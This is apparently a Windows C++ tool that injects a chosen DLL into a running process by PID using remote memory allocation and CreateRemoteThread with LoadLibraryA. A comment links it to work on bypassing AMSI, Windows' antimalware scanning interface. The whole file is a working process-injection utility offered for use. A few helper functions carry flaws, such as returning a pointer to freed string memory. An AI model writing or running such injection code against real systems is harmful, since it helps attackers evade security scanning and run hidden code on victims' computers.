#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <string>

// Inspired by the work of TOM CARVER -> https://x64sec.sh/understanding-and-bypassing-amsi/

LPCWSTR ConvertCharToLPCWSTR(const char* charArray)
{
    int length = strlen(charArray) + 1;
    int lengthW = MultiByteToWideChar(CP_ACP, 0, charArray, length, NULL, 0);
    wchar_t* wideArray = new wchar_t[lengthW];
    MultiByteToWideChar(CP_ACP, 0, charArray, length, wideArray, lengthW);
    return wideArray;
}

BOOL InjectDll(DWORD procID, char* dllName) {
    char fullDllName[MAX_PATH];
    LPVOID loadLibrary;
    LPVOID remoteString;

    if (procID == 0) {
        return FALSE;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    if (hProc == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    GetFullPathNameA(dllName, MAX_PATH, fullDllName, NULL);

    loadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(ConvertCharToLPCWSTR("kernel32.dll")), "LoadLibraryA");
    remoteString = VirtualAllocEx(hProc, NULL, strlen(fullDllName), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    WriteProcessMemory(hProc, remoteString, fullDllName, strlen(fullDllName), NULL);
    CreateRemoteThread(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibrary, (LPVOID)remoteString, NULL, NULL);

    CloseHandle(hProc);
    return TRUE;
}


const char* WCharToConstChar(const WCHAR* wstr)
{
    std::string str;
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (len > 0)
    {
        str.resize(len);
        WideCharToMultiByte(CP_UTF8, 0, wstr, -1, &str[0], len, NULL, NULL);
    }
    return str.c_str();
}

int main(int argc, char** argv)
{
    char* proc_pid = argv[1];
    int int_pid = std::stoi(proc_pid);
    char* dllName = argv[2];
    if (InjectDll((DWORD)int_pid, dllName)) {
        std::cout << "Injected ! " << std::endl;
    }
    else {
        std::cout << "Error while injecting." << std::endl;
    }
}
